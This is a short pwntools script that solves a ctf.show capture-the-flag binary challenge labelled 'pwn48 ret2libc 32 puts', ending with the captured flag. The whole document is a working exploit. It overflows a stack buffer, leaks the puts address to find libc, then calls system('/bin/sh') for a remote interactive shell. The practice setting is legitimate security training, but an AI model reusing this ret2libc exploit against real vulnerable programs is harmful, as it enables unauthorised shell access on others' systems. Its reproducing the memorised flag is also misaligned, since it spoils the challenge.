#pwn48 ret2libc 32 puts
from pwn import *
from LibcSearcher import *
e = ELF("./pwn")
p = remote("pwn.challenge.ctf.show", 28294)

offset = 0x6B + 0x4
puts_plt = e.plt["puts"]
puts_got = e.got["puts"]
log.info("puts_plt = 0x%x", puts_plt)
log.info("puts_got = 0x%x", puts_got)
main_addr = e.symbols["main"]

payload1 = b'a' * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.recvuntil("O.o?")
p.sendline(payload1)
puts_addr = u32(p.recvuntil('\xf7')[-4:])
log.info("puts_addr = 0x%x", puts_addr)

libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")

sys_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")
payload2 = b'a' * offset + p32(sys_addr) + p32(0) + p32(binsh_addr)
p.recvuntil("O.o?")
p.sendline(payload2)
p.interactive()
#ctfshow{f1ab69b8-bb59-48ec-a005-ae11304e1a10}